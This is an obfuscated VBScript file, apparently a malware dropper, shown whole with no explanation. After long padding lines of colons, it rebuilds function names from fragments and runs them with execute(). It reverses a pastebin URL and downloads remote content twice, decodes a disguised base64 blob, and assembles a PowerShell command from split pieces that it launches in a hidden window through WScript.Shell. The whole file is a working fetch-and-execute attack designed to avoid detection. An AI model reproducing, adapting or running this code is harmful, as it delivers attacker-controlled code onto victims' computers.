:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::

:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
'Update 14/06/2022
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::

FKZVXBDMGKXPNBHFCMFSSBX= "QMGYKDFDDCNGCNHJBMYRJOMCHXJGXXMQDXMSOKHQGGVJOZKWTYO"

Function vwSCE(aAeDk,LlGrE)
dim xnzsI
xnzsI = "vwSCE = "
xnzsI = xnzsI + "InS" + "tr" + "(aAeDk, LlGrE)"
execute( xnzsI )
End Function

Function NXAAF(bdcNG,issrC,fTDfX)
dim VzXrZ
VzXrZ = "NXAAF = "
VzXrZ = VzXrZ + "Replace"
VzXrZ = VzXrZ + "(bdcNG ,issrC, fTDfX)"

execute( VzXrZ )
End Function

Function KdJlg( eYjoB )
dim UZTbn
UZTbn = "KdJlg = "
UZTbn = UZTbn + Trim(" StrR ")
UZTbn = UZTbn + LTrim(" eve" ) + RTrim("rse ") + "( eYjoB )"

execute( UZTbn )
End Function

dim sqOeU
sqOeU = "  "





dim ogydb











ogydb = KdJlg("==ешцешцpешцQKешцешцCешцBBwcешцkGешцFBgQешцQCешцgешцешцLешцcCешцlBQdешцIHешцUBwJешцешцCешцsешцwJешцgFешцWBgWешцsEешцGBwJешцешцCешцsешцwJешцUGешц1BgcешцQFешцnешцешцIешцwCешцnешцешцaешцQHешц0BешцcешцMHешц6ешцwLешц8CешцwBQYешцMHешц0BQ" & sqOeU & "ешцIGешцpBgbешц4CешцjBwbешц0GешцvешцgcешцEGешц3BwLешцQFешцCBешцdешцkDешцGBQTешцgFешцUBwJешцgCешцgешцQXешц0FешцbBешцdешцMGешцlBgaешцIGешцvBwWешцешцCешцsешцешцbешцwGешц1BgbешцQCешцoешцQ" & sqOeU & "ешцsGешцvBgdешц4GешцJBgLешцkCешцnешцgbешцUHешцSBwJешцgCешцkBwbешцgGешц0BQ" & sqOeU & "ешц0Eешц0BQ" & sqOeU & "ешцcEешцuешцQKешцcCешцxешцwcешцMHешцhBешцbешцMEешцuешцwMешцkHешцyBQYешцIHешцiBQaешцwEешцzBwcешцEGешцsBwQешцcCешцoешцQ" & sqOeU & "ешцешцHешц5BешцVешцQHешцlBwRешц4CешцpешцешцIешцEEешцvBgSешцQEешц4BешцJешцешцCешцoешцешц" & sqOeU & "ешцEGешцvBешцTешц4CешцuBQaешцEGешцtBwbешцQEешц0BgbешцUGешцyBgcешцUHешцDBgOешцoDешцdBgbешцkGешцhBQbешц8GешцEBешцcешцешцHешцBBgLешц0GешцlBешцdешцMHешц5BwUешцsFешц7ешцQKешцешцCешцxBQ" & sqOeU & "ешцkGешц3BgRешцQCешцgешцешцKешцcGешцuBQaешцIHешц0BwUешцQDешц2ешцQ" & sqOeU & "ешцMHешцhBgQешц0GешцvBgcешцYEешц6ешцgOешц0Fешц0BgcешцUGешц2Bgbешц8GешцDBgLешц0GешцlBешцdешцMHешц5BwUешцsFешцgешцQPешцешцCешцBBwbешцoEешцEBешцeешцQCешцgешцQXешц0FешцbBQ" & sqOeU & "ешцQHешц5BgQешцsFешц7ешцwJешцUCешцwBQSешцQGешцCBQYешцUCешцnешцешцIешц0DешцgешцQQешцMHешцpBQRешцIEешцkешцwOешцcCешцlешцgTешц0EешцVBgRешцkEешцlешцwJешцешцCешц9ешцешцIешцEHешцlBQaешцcHешцGBешцJ")









ogydb = NXAAF( ogydb, sqOeU , "Z")











dim rNKhE











dim mMOUP

Function KbSjB(xBpiV)
set igtwp  = createobject( Trim(" Microsoft ") + RTrim(".XmlHttp ") )
igtwp.open Trim(" G ") + RTrim("ET ") , (xBpiV), false
igtwp.send ""
execute( KdJlg(")txeTesnopser.pwtgi( = BjSbK") )
end Function 







dim vegQU
vegQU = "("
vegQU = vegQU & "лъс)"
vegQU = vegQU & ";" & vegQU







mMOUP = NXAAF( KdJlg( KbSjB( KbSjB( KdJlg("TgijzAqh/war/moc.nibetsap//:sptth") ) ) ) , "ÐÐÐ","A")












rNKhE = ("$Codigo = '") & ogydb & "'" 

rNKhE = rNKhE & ";$uDFil = [System.Text.Encoding]::Unicode.GetString( "
rNKhE = rNKhE & "[System.Convert]::FromBase64String( $Codigo.replace('цше','A') ) ).replace('%aBdIp%', '" +  WScript.ScriptFullName  + "' ).replace('%IFUMN%','"

rNKhE = rNKhE & (mMOUP)

rNKhE = rNKhE & ( "');po(лъс);(лъс)wers(лъс);(лъс)he(лъс);(лъс)ll.(лъс);(лъс)ex(лъс);(лъс)e -Co(лъс);(лъс)m(лъс);(лъс)m(лъс);(лъс)and $uD(лъс);(лъс)Fi(лъс);(лъс)l" )







dim GByWM
GByWM = ""







rNKhE = ( NXAAF(rNKhE, vegQU, GByWM) ) 






















 






















































set RhcYi =  CreateObject("WScript.Shell")










RhcYi.Run "powershell -command " & rNKhE , 0, false









